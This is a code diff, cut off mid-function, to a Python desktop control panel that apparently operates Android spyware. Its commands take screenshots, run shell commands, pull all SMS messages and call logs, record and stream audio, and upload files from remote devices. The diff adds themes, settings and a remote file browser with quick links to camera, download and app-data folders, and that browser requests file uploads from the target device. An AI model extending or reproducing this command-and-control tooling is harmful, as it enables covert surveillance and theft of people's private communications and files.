@@ -11,6 +11,7 @@ import wave
 import queue
 import tkinter as tk
 from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog, Menu
+from tkinter import font as tkfont
 
 try:
     import sounddevice as sd
@@ -45,6 +46,7 @@ class AppConfig:
     APP_ROOT = os.path.dirname(os.path.abspath(__file__))
     DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
     DEVICE_TAGS_FILE = os.path.join(APP_ROOT, "device_tags.json")
+    SETTINGS_FILE = os.path.join(APP_ROOT, "settings.json")
     SECRET_KEY = "Adv_Comm_Monitor_SecKey_V8_Complete_Enhanced_Features"
 
     # Audio parameters
@@ -53,7 +55,66 @@ class AppConfig:
     REC_SAMPWIDTH = 2
 
 
-# --- Command Constants ---
+# --- Theme Manager ---
+class ThemeManager:
+    def __init__(self):
+        self.current_theme = "light"
+        self.themes = {
+            "light": {
+                "bg": "#ffffff",
+                "fg": "#000000",
+                "select_bg": "#0078d4",
+                "select_fg": "#ffffff",
+                "entry_bg": "#ffffff",
+                "entry_fg": "#000000",
+                "button_bg": "#f0f0f0",
+                "button_fg": "#000000",
+                "frame_bg": "#f8f9fa",
+                "text_bg": "#ffffff",
+                "text_fg": "#000000",
+                "listbox_bg": "#ffffff",
+                "listbox_fg": "#000000",
+                "menu_bg": "#f0f0f0",
+                "menu_fg": "#000000",
+                "status_success": "#28a745",
+                "status_error": "#dc3545",
+                "status_warning": "#ffc107",
+                "status_info": "#17a2b8",
+            },
+            "dark": {
+                "bg": "#2b2b2b",
+                "fg": "#ffffff",
+                "select_bg": "#0078d4",
+                "select_fg": "#ffffff",
+                "entry_bg": "#3c3c3c",
+                "entry_fg": "#ffffff",
+                "button_bg": "#404040",
+                "button_fg": "#ffffff",
+                "frame_bg": "#353535",
+                "text_bg": "#2b2b2b",
+                "text_fg": "#ffffff",
+                "listbox_bg": "#3c3c3c",
+                "listbox_fg": "#ffffff",
+                "menu_bg": "#404040",
+                "menu_fg": "#ffffff",
+                "status_success": "#32d74b",
+                "status_error": "#ff453a",
+                "status_warning": "#ffcc02",
+                "status_info": "#64d2ff",
+            },
+        }
+
+    def get_theme(self, theme_name=None):
+        if theme_name is None:
+            theme_name = self.current_theme
+        return self.themes.get(theme_name, self.themes["light"])
+
+    def toggle_theme(self):
+        self.current_theme = "dark" if self.current_theme == "light" else "light"
+        return self.current_theme
+
+
+# --- Enhanced Command Constants ---
 class Commands:
     SIO_CMD_TAKE_SCREENSHOT = "command_take_screenshot"
     SIO_CMD_LIST_FILES = "command_list_files"
@@ -61,6 +122,7 @@ class Commands:
     SIO_CMD_UPLOAD_SPECIFIC_FILE = "command_upload_specific_file"
     SIO_CMD_EXECUTE_SHELL = "command_execute_shell"
     SIO_CMD_GET_SMS_LIST = "command_get_sms_list"
+    SIO_CMD_GET_ALL_SMS = "command_get_all_sms"  # Enhanced unlimited SMS
     SIO_CMD_RECORD_AUDIO_FIXED = "command_record_audio_fixed"
     SIO_CMD_START_LIVE_AUDIO = "command_start_live_audio"
     SIO_CMD_STOP_LIVE_AUDIO = "command_stop_live_audio"
@@ -71,13 +133,13 @@ class Commands:
     SIO_CMD_GET_CALL_LOGS = "command_get_call_logs"
     SIO_EVENT_REQUEST_REGISTRATION_INFO = "request_registration_info"
 
-    # Document Library Commands
+    # Enhanced Document Library Commands
     SIO_CMD_CATALOG_LIBRARY = "command_catalog_library"
     SIO_CMD_ANALYZE_CONTENT = "command_analyze_content"
     SIO_CMD_PROCESS_QUEUE = "command_process_queue"
 
 
-# --- Utilities ---
+# --- Enhanced Utilities ---
 class Utils:
     @staticmethod
     def sanitize_device_id(device_id):
@@ -133,14 +195,71 @@ class Utils:
             ".zip": "🗜️",
             ".rar": "🗜️",
             ".7z": "🗜️",
+            ".apk": "📱",
+            ".db": "🗃️",
+            ".sqlite": "🗃️",
         }
         return icons.get(ext, "📄")
 
+    @staticmethod
+    def format_file_size(size_bytes):
+        """Format file size in human readable format"""
+        if size_bytes < 1024:
+            return f"{size_bytes} B"
+        elif size_bytes < 1024 * 1024:
+            return f"{size_bytes / 1024:.1f} KB"
+        elif size_bytes < 1024 * 1024 * 1024:
+            return f"{size_bytes / (1024 * 1024):.1f} MB"
+        else:
+            return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"
 
-# --- Device Manager ---
+
+# --- Settings Manager ---
+class SettingsManager:
+    def __init__(self):
+        self.settings = self.load_settings()
+
+    def load_settings(self):
+        """تحميل الإعدادات من الملف"""
+        try:
+            if os.path.exists(AppConfig.SETTINGS_FILE):
+                with open(AppConfig.SETTINGS_FILE, "r", encoding="utf-8") as f:
+                    return json.load(f)
+        except Exception as e:
+            logger.error(f"Error loading settings: {e}")
+
+        return {
+            "theme": "light",
+            "auto_refresh": True,
+            "sound_alerts": True,
+            "battery_monitoring": True,
+            "network_optimization": True,
+            "compression_enabled": True,
+            "max_file_display": 100,
+            "window_geometry": "1200x800",
+        }
+
+    def save_settings(self):
+        """حفظ الإعدادات إلى الملف"""
+        try:
+            with open(AppConfig.SETTINGS_FILE, "w", encoding="utf-8") as f:
+                json.dump(self.settings, f, ensure_ascii=False, indent=4)
+        except Exception as e:
+            logger.error(f"Error saving settings: {e}")
+
+    def get(self, key, default=None):
+        return self.settings.get(key, default)
+
+    def set(self, key, value):
+        self.settings[key] = value
+        self.save_settings()
+
+
+# --- Enhanced Device Manager ---
 class DeviceManager:
     def __init__(self):
         self.device_tags = {}
+        self.device_stats = {}
         self.load_device_tags()
 
     def load_device_tags(self):
@@ -148,20 +267,28 @@ class DeviceManager:
         try:
             if os.path.exists(AppConfig.DEVICE_TAGS_FILE):
                 with open(AppConfig.DEVICE_TAGS_FILE, "r", encoding="utf-8") as f:
-                    self.device_tags = json.load(f)
+                    data = json.load(f)
+                    self.device_tags = data.get("tags", {})
+                    self.device_stats = data.get("stats", {})
                 logger.info(f"Loaded {len(self.device_tags)} device tags")
         except Exception as e:
             logger.error(f"Error loading device tags: {e}", exc_info=True)
             self.device_tags = {}
+            self.device_stats = {}
 
     def save_device_tags(self):
         """حفظ علامات الأجهزة إلى الملف"""
         try:
+            data = {
+                "tags": self.device_tags,
+                "stats": self.device_stats,
+                "last_updated": datetime.datetime.now().isoformat(),
+            }
             with open(AppConfig.DEVICE_TAGS_FILE, "w", encoding="utf-8") as f:
-                json.dump(self.device_tags, f, ensure_ascii=False, indent=4)
-            logger.info("Saved device tags")
+                json.dump(data, f, ensure_ascii=False, indent=4)
+            logger.info("Saved device data")
         except Exception as e:
-            logger.error(f"Error saving device tags: {e}", exc_info=True)
+            logger.error(f"Error saving device data: {e}", exc_info=True)
 
     def set_tag(self, device_id, tag):
         """وضع علامة على جهاز"""
@@ -174,6 +301,19 @@ class DeviceManager:
     def get_tag(self, device_id):
         """الحصول على علامة الجهاز"""
         return self.device_tags.get(device_id, "")
+
+    def update_stats(self, device_id, stat_type, value):
+        """تحديث إحصائيات الجهاز"""
+        if device_id not in self.device_stats:
+            self.device_stats[device_id] = {}
+        self.device_stats[device_id][stat_type] = value
+        self.device_stats[device_id][
+            "last_updated"
+        ] = datetime.datetime.now().isoformat()
+
+    def get_stats(self, device_id):
+        """الحصول على إحصائيات الجهاز"""
+        return self.device_stats.get(device_id, {})
 
 
 # --- Flask App Setup ---
@@ -194,17 +334,6 @@ logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger("AdvancedCommMonitor")
-
-# Global Variables
-connected_clients_sio = {}
-device_manager = DeviceManager()
-gui_app = None
-
-# Audio Variables
-audio_queue = queue.Queue()
-stream_active_for_device = {}
-playback_thread = None
-live_audio_buffers = {}
 
 
 # --- Remote File System Manager ---
@@ -235,17 +364,14 @@ class RemoteFileSystemManager:
         """Get files from cache for a specific device and path"""
         if device_id not in self.file_cache:
             return None
-
         return self.file_cache[device_id].get(path)
 
     def is_cache_valid(self, device_id, path, max_age_seconds=60):
         """Check if the cache is still valid"""
         if device_id not in self.last_update:
             return False
-
         if device_id not in self.file_cache or path not in self.file_cache[device_id]:
             return False
-
         age = (datetime.datetime.now() - self.last_update[device_id]).total_seconds()
         return age < max_age_seconds
 
@@ -255,7 +381,6 @@ class RemoteFileSystemManager:
         """Add a pending operation for a device"""
         if device_id not in self.pending_operations:
             self.pending_operations[device_id] = {}
-
         self.pending_operations[device_id][command_id] = {
             "type": operation_type,
             "details": details or {},
@@ -272,11 +397,845 @@ class RemoteFileSystemManager:
             self.pending_operations[device_id].pop(command_id, None)
 
 
-# Initialize Remote File System Manager
+# --- Enhanced File Browser Window ---
+class EnhancedFileBrowserWindow:
+    def __init__(self, master, device_id, target_id, parent_app):
+        self.master = master
+        self.window = tk.Toplevel(master)
+        self.window.title(f"📂 Enhanced File Browser - {device_id}")
+        self.window.geometry("1000x700")
+        self.window.minsize(900, 600)
+
+        self.device_id = device_id
+        self.current_device_id = device_id
+        self.target_id = target_id
+        self.parent_app = parent_app
+        self.current_path = "/sdcard"
+        self.path_history = ["/sdcard"]
+        self.history_pos = 0
+
+        # Apply current theme
+        self.current_theme = theme_manager.get_theme()
+        self.window.configure(bg=self.current_theme["bg"])
+
+        # Common Android folders for quick access
+        self.common_folders = [
+            ("/sdcard", "📁 SD Card"),
+            ("/storage/emulated/0", "📁 Internal Storage"),
+            ("/sdcard/Download", "📁 Downloads"),
+            ("/sdcard/DCIM", "📁 Camera"),
+            ("/sdcard/Pictures", "📁 Pictures"),
+            ("/sdcard/Documents", "📁 Documents"),
+            ("/sdcard/Movies", "📁 Movies"),
+            ("/sdcard/Music", "📁 Music"),
+            ("/sdcard/Android/data", "📁 App Data"),
+        ]
+
+        self._setup_ui()
+        self.list_files_for_path("/sdcard")
+        self.window.protocol("WM_DELETE_WINDOW", self.close)
+
+    def _setup_ui(self):
+        """Set up the enhanced UI components"""
+        # Main frame
+        main_frame = tk.Frame(self.window, bg=self.current_theme["bg"])
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Toolbar frame
+        toolbar_frame = tk.Frame(main_frame, bg=self.current_theme["frame_bg"])
+        toolbar_frame.pack(fill=tk.X, padx=5, pady=5)
+
+        # Navigation buttons
+        self.back_button = tk.Button(
+            toolbar_frame,
+            text="🔙 Back",
+            command=self.go_back,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+        )
+        self.back_button.pack(side=tk.LEFT, padx=2)
+
+        self.forward_button = tk.Button(
+            toolbar_frame,
+            text="🔜 Forward",
+            command=self.go_forward,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+        )
+        self.forward_button.pack(side=tk.LEFT, padx=2)
+        self.forward_button.config(state=tk.DISABLED)
+
+        self.up_button = tk.Button(
+            toolbar_frame,
+            text="🔝 Up",
+            command=self.go_up,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+        )
+        self.up_button.pack(side=tk.LEFT, padx=2)
+
+        self.refresh_button = tk.Button(
+            toolbar_frame,
+            text="🔄 Refresh",
+            command=self.refresh_current_directory,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+        )
+        self.refresh_button.pack(side=tk.LEFT, padx=2)
+
+        # Path entry
+        tk.Label(
+            toolbar_frame,
+            text="Path:",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        ).pack(side=tk.LEFT, padx=(10, 2))
+        self.path_var = tk.StringVar(value="/sdcard")
+        self.path_entry = tk.Entry(
+            toolbar_frame,
+            textvariable=self.path_var,
+            width=50,
+            bg=self.current_theme["entry_bg"],
+            fg=self.current_theme["entry_fg"],
+        )
+        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
+        self.path_entry.bind("<Return>", lambda e: self.navigate_to_path())
+
+        self.go_button = tk.Button(
+            toolbar_frame,
+            text="Go",
+            command=self.navigate_to_path,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+        )
+        self.go_button.pack(side=tk.LEFT, padx=2)
+
+        # Content frame (paned window for favorites and files)
+        content_frame = tk.PanedWindow(
+            main_frame, orient=tk.HORIZONTAL, bg=self.current_theme["bg"]
+        )
+        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Favorites frame
+        favorites_frame = tk.LabelFrame(
+            content_frame,
+            text="Quick Access",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        content_frame.add(favorites_frame, width=250)
+
+        self.favorites_listbox = tk.Listbox(
+            favorites_frame,
+            height=15,
+            font=("Arial", 9),
+            bg=self.current_theme["listbox_bg"],
+            fg=self.current_theme["listbox_fg"],
+            selectbackground=self.current_theme["select_bg"],
+        )
+        favorites_scrollbar = tk.Scrollbar(
+            favorites_frame, orient="vertical", command=self.favorites_listbox.yview
+        )
+        self.favorites_listbox.config(yscrollcommand=favorites_scrollbar.set)
+
+        self.favorites_listbox.pack(
+            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
+        )
+        favorites_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+
+        # Populate favorites
+        for path, name in self.common_folders:
+            self.favorites_listbox.insert(tk.END, name)
+        self.favorites_listbox.bind("<Double-1>", self.on_favorite_double_click)
+
+        # Files frame
+        files_frame = tk.Frame(content_frame, bg=self.current_theme["bg"])
+        content_frame.add(files_frame, width=750)
+
+        # File list with details
+        self.files_listbox = tk.Listbox(
+            files_frame,
+            font=("Consolas", 9),
+            bg=self.current_theme["listbox_bg"],
+            fg=self.current_theme["listbox_fg"],
+            selectbackground=self.current_theme["select_bg"],
+        )
+        files_scrollbar = tk.Scrollbar(
+            files_frame, orient="vertical", command=self.files_listbox.yview
+        )
+        self.files_listbox.config(yscrollcommand=files_scrollbar.set)
+
+        self.files_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
+        files_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+
+        self.files_listbox.bind("<Double-1>", self.on_file_double_click)
+        self.files_listbox.bind("<Button-3>", self.on_file_right_click)
+
+        # Status bar
+        self.status_var = tk.StringVar(value="Ready")
+        status_bar = tk.Label(
+            main_frame,
+            textvariable=self.status_var,
+            relief=tk.SUNKEN,
+            anchor=tk.W,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=2)
+
+        # Bottom buttons frame
+        buttons_frame = tk.Frame(main_frame, bg=self.current_theme["bg"])
+        buttons_frame.pack(fill=tk.X, padx=5, pady=5)
+
+        self.upload_button = tk.Button(
+            buttons_frame,
+            text="📤 Upload Selected",
+            command=self.upload_selected,
+            bg=self.current_theme["status_success"],
+            fg="#ffffff",
+        )
+        self.upload_button.pack(side=tk.LEFT, padx=5)
+
+        self.analyze_button = tk.Button(
+            buttons_frame,
+            text="🔍 Analyze Selected",
+            command=self.analyze_selected,
+            bg=self.current_theme["status_info"],
+            fg="#ffffff",
+        )
+        self.analyze_button.pack(side=tk.LEFT, padx=5)
+
+    def on_favorite_double_click(self, event):
+        """Handle double-click on favorite folder"""
+        selection = self.favorites_listbox.curselection()
+        if not selection:
+            return
+        index = selection[0]
+        if 0 <= index < len(self.common_folders):
+            path = self.common_folders[index][0]
+            self.navigate_to_directory(path)
+
+    def on_file_double_click(self, event):
+        """Handle double-click on file with enhanced navigation"""
+        selection = self.files_listbox.curselection()
+        if not selection:
+            return
+
+        index = selection[0]
+        selected_text = self.files_listbox.get(index)
+
+        # Handle parent directory navigation
+        if ".. (Parent Directory)" in selected_text:
+            self.go_up()
+            return
+
+        # Handle regular files and directories
+        if hasattr(self, "current_files") and self.current_files:
+            # Adjust index for parent directory entry
+            actual_index = index
+            if self.current_path not in ["/", "/sdcard", ""] and index > 0:
+                actual_index = index - 1  # Account for parent directory entry
+
+            if actual_index < len(self.current_files):
+                file_info = self.current_files[actual_index]
+
+                if file_info.get("type") == "directory":
+                    folder_name = file_info.get("name", "")
+                    new_path = (
+                        f"{self.current_path}/{folder_name}"
+                        if not self.current_path.endswith("/")
+                        else f"{self.current_path}{folder_name}"
+                    )
+                    self.navigate_to_directory(new_path)
+                else:
+                    # For files, show info or offer actions
+                    file_name = file_info.get("name", "")
+                    file_size = Utils.format_file_size(file_info.get("size", 0))
+                    file_date = file_info.get("modified", "Unknown")
+
+                    file_path = (
+                        f"{self.current_path}/{file_name}"
+                        if not self.current_path.endswith("/")
+                        else f"{self.current_path}{file_name}"
+                    )
+
+                    # Create custom dialog for file actions
+                    action_window = tk.Toplevel(self.window)
+                    action_window.title("File Action")
+                    action_window.geometry("400x250")
+                    action_window.configure(bg=self.current_theme["bg"])
+                    action_window.transient(self.window)
+                    action_window.grab_set()
+
+                    # Center the window
+                    action_window.geometry(
+                        f"+{self.window.winfo_x() + 100}+{self.window.winfo_y() + 100}"
+                    )
+
+                    # File info
+                    info_frame = tk.Frame(
+                        action_window, bg=self.current_theme["frame_bg"]
+                    )
+                    info_frame.pack(fill=tk.X, padx=10, pady=10)
+
+                    tk.Label(
+                        info_frame,
+                        text=f"📄 File: {file_name}",
+                        bg=self.current_theme["frame_bg"],
+                        fg=self.current_theme["fg"],
+                        font=("Arial", 10, "bold"),
+                    ).pack(anchor="w")
+                    tk.Label(
+                        info_frame,
+                        text=f"📊 Size: {file_size}",
+                        bg=self.current_theme["frame_bg"],
+                        fg=self.current_theme["fg"],
+                    ).pack(anchor="w")
+                    tk.Label(
+                        info_frame,
+                        text=f"📅 Modified: {file_date}",
+                        bg=self.current_theme["frame_bg"],
+                        fg=self.current_theme["fg"],
+                    ).pack(anchor="w")
+                    tk.Label(
+                        info_frame,
+                        text=f"📂 Path: {file_path}",
+                        bg=self.current_theme["frame_bg"],
+                        fg=self.current_theme["fg"],
+                        wraplength=350,
+                    ).pack(anchor="w")
+
+                    # Action buttons
+                    button_frame = tk.Frame(action_window, bg=self.current_theme["bg"])
+                    button_frame.pack(fill=tk.X, padx=10, pady=10)
+
+                    def upload_action():
+                        action_window.destroy()
+                        result = send_command_to_client(
+                            self.target_id,
+                            Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
+                            args={"path": file_path},
+                        )
+                        if result.get("status") == "sent":
+                            self.status_var.set(f"📤 Upload requested for: {file_name}")
+                            self.parent_app.add_system_log(
+                                f"📤 Upload requested: {file_path}", "success"
+                            )
+
+                    def analyze_action():
+                        action_window.destroy()
+                        result = send_command_to_client(
+                            self.target_id,
+                            Commands.SIO_CMD_ANALYZE_CONTENT,
+                            args={"filePath": file_path},
+                        )
+                        if result.get("status") == "sent":
+                            self.status_var.set(
+                                f"🔍 Analysis requested for: {file_name}"
+                            )
+                            self.parent_app.add_system_log(
+                                f"🔍 Analysis requested: {file_path}", "success"
+                            )
+
+                    def copy_action():
+                        action_window.destroy()
+                        self.window.clipboard_clear()
+                        self.window.clipboard_append(file_path)
+                        self.status_var.set(f"📋 Copied to clipboard: {file_path}")
+
+                    def cancel_action():
+                        action_window.destroy()
+
+                    tk.Button(
+                        button_frame,
+                        text="📤 Upload File",
+                        command=upload_action,
+                        bg=self.current_theme["status_success"],
+                        fg="#ffffff",
+                        width=15,
+                    ).pack(side=tk.LEFT, padx=5)
+                    tk.Button(
+                        button_frame,
+                        text="🔍 Analyze File",
+                        command=analyze_action,
+                        bg=self.current_theme["status_info"],
+                        fg="#ffffff",
+                        width=15,
+                    ).pack(side=tk.LEFT, padx=5)
+                    tk.Button(
+                        button_frame,
+                        text="📋 Copy Path",
+                        command=copy_action,
+                        bg=self.current_theme["button_bg"],
+                        fg=self.current_theme["button_fg"],
+                        width=15,
+                    ).pack(side=tk.LEFT, padx=5)
+                    tk.Button(
+                        button_frame,
+                        text="❌ Cancel",
+                        command=cancel_action,
+                        bg=self.current_theme["button_bg"],
+                        fg=self.current_theme["button_fg"],
+                        width=15,
+                    ).pack(side=tk.LEFT, padx=5)
+
+    def on_file_right_click(self, event):
+        """Handle right-click on file"""
+        self.files_listbox.selection_clear(0, tk.END)
+        self.files_listbox.selection_set(self.files_listbox.nearest(event.y))
+
+        context_menu = Menu(self.window, tearoff=0)
+        context_menu.add_command(label="📤 Upload", command=self.upload_selected)
+        context_menu.add_command(label="🔍 Analyze", command=self.analyze_selected)
+        context_menu.add_command(
+            label="📋 Copy Path", command=self.copy_path_to_clipboard
+        )
+
+        try:
+            context_menu.tk_popup(event.x_root, event.y_root)
+        finally:
+            context_menu.grab_release()
+
+    def navigate_to_directory(self, path):
+        """Navigate to a directory"""
+        if self.current_path != path:
+            if self.history_pos < len(self.path_history) - 1:
+                self.path_history = self.path_history[: self.history_pos + 1]
+            self.path_history.append(path)
+            self.history_pos = len(self.path_history) - 1
+            self.back_button.config(
+                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
+            )
+            self.forward_button.config(state=tk.DISABLED)
+
+        self.current_path = path
+        self.path_var.set(path)
+        self.list_files_for_path(path)
+
+    def go_back(self):
+        """Navigate back in history"""
+        if self.history_pos > 0:
+            self.history_pos -= 1
+            path = self.path_history[self.history_pos]
+            self.current_path = path
+            self.path_var.set(path)
+            self.list_files_for_path(path)
+            self.back_button.config(
+                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
+            )
+            self.forward_button.config(state=tk.NORMAL)
+
+    def go_forward(self):
+        """Navigate forward in history"""
+        if self.history_pos < len(self.path_history) - 1:
+            self.history_pos += 1
+            path = self.path_history[self.history_pos]
+            self.current_path = path
+            self.path_var.set(path)
+            self.list_files_for_path(path)
+            self.forward_button.config(
+                state=(
+                    tk.NORMAL
+                    if self.history_pos < len(self.path_history) - 1
+                    else tk.DISABLED
+                )
+            )
+            self.back_button.config(state=tk.NORMAL)
+
+    def go_up(self):
+        """Navigate to parent directory"""
+        if self.current_path in ["/", "", "/sdcard"]:
+            return
+        parent_path = "/".join(self.current_path.split("/")[:-1]) or "/sdcard"
+        self.navigate_to_directory(parent_path)
+
+    def navigate_to_path(self):
+        """Navigate to the path in the entry field"""
+        path = self.path_var.get() or "/sdcard"
+        self.navigate_to_directory(path)
+
+    def list_files_for_path(self, path):
+        """Request file listing for a path with enhanced error handling"""
+        if not self.target_id:
+            self.status_var.set("❌ Error: No connected device")
+            self.files_listbox.delete(0, tk.END)
+            self.files_listbox.insert(0, "❌ No device connected")
+            return
+
+        # Verify device is still connected
+        if self.target_id not in connected_clients_sio:
+            self.status_var.set("❌ Error: Device disconnected")
+            self.files_listbox.delete(0, tk.END)
+            self.files_listbox.insert(0, "❌ Device disconnected")
+
+            # Show reconnection message
+            def show_reconnect_message():
+                if hasattr(self, "window") and self.window.winfo_exists():
+                    messagebox.showwarning(
+                        "Device Disconnected",
+                        f"The device '{self.device_id}' has disconnected.\n"
+                        f"Please reconnect the device to continue browsing files.",
+                        parent=self.window,
+                    )
+
+            self.window.after(1000, show_reconnect_message)
+            return
+
+        if path == "/":
+            path = "/sdcard"
+            self.current_path = "/sdcard"
+            self.path_var.set("/sdcard")
+
+        self.status_var.set(f"🔄 Loading files from: {path}...")
+        self.files_listbox.delete(0, tk.END)
+        self.files_listbox.insert(0, "⏳ Loading files...")
+        self.window.update()
+
+        # Check cache first
+        if remote_fs_manager.is_cache_valid(self.device_id, path):
+            self.populate_files_from_cache(path)
+            return
+
+        # Request from device with timeout handling
+        try:
+            result = send_command_to_client(
+                self.target_id,
+                Commands.SIO_CMD_LIST_FILES,
+                args={"path": path},
+                timeout_seconds=20,  # Shorter timeout for file operations
+            )
+
+            if result.get("status") == "sent":
+                self.current_path = path
+                self.path_var.set(path)
+                command_id = result["command_id"]
+                device_id = result.get("device_id", self.device_id)
+
+                remote_fs_manager.add_pending_operation(
+                    device_id, command_id, "list_files", {"path": path}
+                )
+
+                # Set up timeout for this specific request
+                def check_file_list_timeout():
+                    if hasattr(self, "window") and self.window.winfo_exists():
+                        # Check if we still have the same loading state
+                        if (
+                            self.files_listbox.size() == 1
+                            and "Loading files" in self.files_listbox.get(0)
+                        ):
+                            self.files_listbox.delete(0, tk.END)
+                            self.files_listbox.insert(
+                                0, f"⏰ Request timed out for: {path}"
+                            )
+                            self.files_listbox.insert(
+                                1, "🔄 Click Refresh to try again"
+                            )
+                            self.status_var.set(
+                                f"⏰ Request timed out - Try refreshing"
+                            )
+
+                            # Remove pending operation
+                            remote_fs_manager.remove_pending_operation(
+                                device_id, command_id
+                            )
+
+                self.window.after(20000, check_file_list_timeout)  # 20 second timeout
+
+            else:
+                error_msg = result.get("message", "Unknown error")
+                self.files_listbox.delete(0, tk.END)
+                self.files_listbox.insert(0, f"❌ Error: {error_msg}")
+                self.files_listbox.insert(1, "🔄 Click Refresh to try again")
+                self.status_var.set(f"❌ Error requesting file list: {error_msg}")
+
+                # Suggest alternative paths
+                if "permission" in error_msg.lower() or "access" in error_msg.lower():
+                    self.files_listbox.insert(
+                        2, "💡 Try /sdcard/Download or /sdcard/Pictures"
+                    )
+                elif path != "/sdcard":
+                    self.files_listbox.insert(2, "💡 Try /sdcard instead")
+
+        except Exception as e:
+            error_msg = str(e)
+            self.files_listbox.delete(0, tk.END)
+            self.files_listbox.insert(0, f"❌ Exception: {error_msg}")
+            self.files_listbox.insert(1, "🔄 Click Refresh to try again")
+            self.status_var.set(f"❌ Exception during file list request: {error_msg}")
+
+            logger.error(f"Exception in list_files_for_path: {e}", exc_info=True)
+
+            # Log to parent app if available
+            if hasattr(self, "parent_app") and self.parent_app:
+                self.parent_app.add_system_log(
+                    f"❌ File browser error: {error_msg}", "error"
+                )
+
+    def populate_files_from_cache(self, path):
+        """Populate files from cache with better error handling"""
+        try:
+            files = remote_fs_manager.get_files_from_cache(self.device_id, path)
+            self.files_listbox.delete(0, tk.END)
+
+            if files and len(files) > 0:
+                self.current_files = files
+                directories = [f for f in files if f.get("type") == "directory"]
+                regular_files = [f for f in files if f.get("type") != "directory"]
+
+                directories.sort(key=lambda x: x.get("name", "").lower())
+                regular_files.sort(key=lambda x: x.get("name", "").lower())
+
+                # Add parent directory option if not at root
+                if path not in ["/", "/sdcard", ""]:
+                    self.files_listbox.insert(tk.END, "📁 .. (Parent Directory)")
+
+                total_items = 0
+                for file_info in directories + regular_files:
+                    try:
+                        name = file_info.get("name", "Unknown")
+                        size = file_info.get("size", 0)
+                        date = file_info.get("modified", "Unknown")
+                        file_type = file_info.get("type", "file")
+
+                        icon = (
+                            "📁"
+                            if file_type == "directory"
+                            else Utils.get_file_icon(name)
+                        )
+
+                        if file_type == "directory":
+                            size_str = "DIR"
+                        else:
+                            size_str = Utils.format_file_size(size)
+
+                        # Format the display line with proper spacing
+                        display_line = f"{icon} {name:<35} {size_str:>10} {date}"
+                        self.files_listbox.insert(tk.END, display_line)
+                        total_items += 1
+
+                    except Exception as item_error:
+                        logger.warning(f"Error processing file item: {item_error}")
+                        self.files_listbox.insert(
+                            tk.END, f"❌ Error processing item: {file_info}"
+                        )
+
+                self.status_var.set(f"✅ Loaded {total_items} items from {path}")
+
+                # Store current files for operations
+                if not hasattr(self, "current_files"):
+                    self.current_files = []
+
+            else:
+                self.files_listbox.insert(
+                    tk.END, "📭 No files found or directory not accessible"
+                )
+                if path in ["/", ""]:
+                    self.files_listbox.insert(tk.END, "💡 Try navigating to /sdcard")
+                self.status_var.set(f"📭 No files found in {path}")
+                self.current_files = []
+
+        except Exception as e:
+            logger.error(f"Error in populate_files_from_cache: {e}", exc_info=True)
+            self.files_listbox.delete(0, tk.END)
+            self.files_listbox.insert(tk.END, f"❌ Error loading files: {e}")
+            self.files_listbox.insert(tk.END, "🔄 Try refreshing the directory")
+            self.status_var.set(f"❌ Error loading files: {e}")
+            self.current_files = []
+
+    def refresh_current_directory(self):
+        """Refresh the current directory listing"""
+        remote_fs_manager.clear_cache(self.device_id)
+        self.list_files_for_path(self.current_path)
+
+    def upload_selected(self):
+        """Upload the selected file"""
+        selection = self.files_listbox.curselection()
+        if not selection:
+            messagebox.showinfo(
+                "Select File",
+                "Please select a file to upload from the file list (not from Quick Access).",
+                parent=self.window,
+            )
+            return
+
+        # Check if we actually have file data loaded
+        if not hasattr(self, "current_files") or not self.current_files:
+            messagebox.showinfo(
+                "No Files",
+                "No files are currently loaded. Please navigate to a directory first.",
+                parent=self.window,
+            )
+            return
+
+        index = selection[0]
+        if index >= len(self.current_files):
+            messagebox.showinfo(
+                "Invalid Selection", "Selected item is not valid.", parent=self.window
+            )
+            return
+
+        file_info = self.current_files[index]
+        if file_info.get("type") == "directory":
+            messagebox.showinfo(
+                "Select File",
+                "Please select a file, not a directory.",
+                parent=self.window,
+            )
+            return
+
+        file_name = file_info.get("name", "")
+        file_path = (
+            f"{self.current_path}/{file_name}"
+            if not self.current_path.endswith("/")
+            else f"{self.current_path}{file_name}"
+        )
+
+        result = send_command_to_client(
+            self.target_id,
+            Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
+            args={"path": file_path},
+        )
+        if result.get("status") == "sent":
+            self.status_var.set(f"Upload requested for: {file_path}")
+            self.parent_app.add_system_log(
+                f"📤 Upload requested: {file_path}", "success"
+            )
+        else:
+            messagebox.showerror(
+                "Upload Error",
+                f"Failed to request upload: {result.get('message', 'Unknown error')}",
+                parent=self.window,
+            )
+
+    def analyze_selected(self):
+        """Analyze the selected file"""
+        selection = self.files_listbox.curselection()
+        if not selection:
+            messagebox.showinfo(
+                "Select File",
+                "Please select a file to analyze from the file list (not from Quick Access).",
+                parent=self.window,
+            )
+            return
+
+        # Check if we actually have file data loaded
+        if not hasattr(self, "current_files") or not self.current_files:
+            messagebox.showinfo(
+                "No Files",
+                "No files are currently loaded. Please navigate to a directory first.",
+                parent=self.window,
+            )
+            return
+
+        index = selection[0]
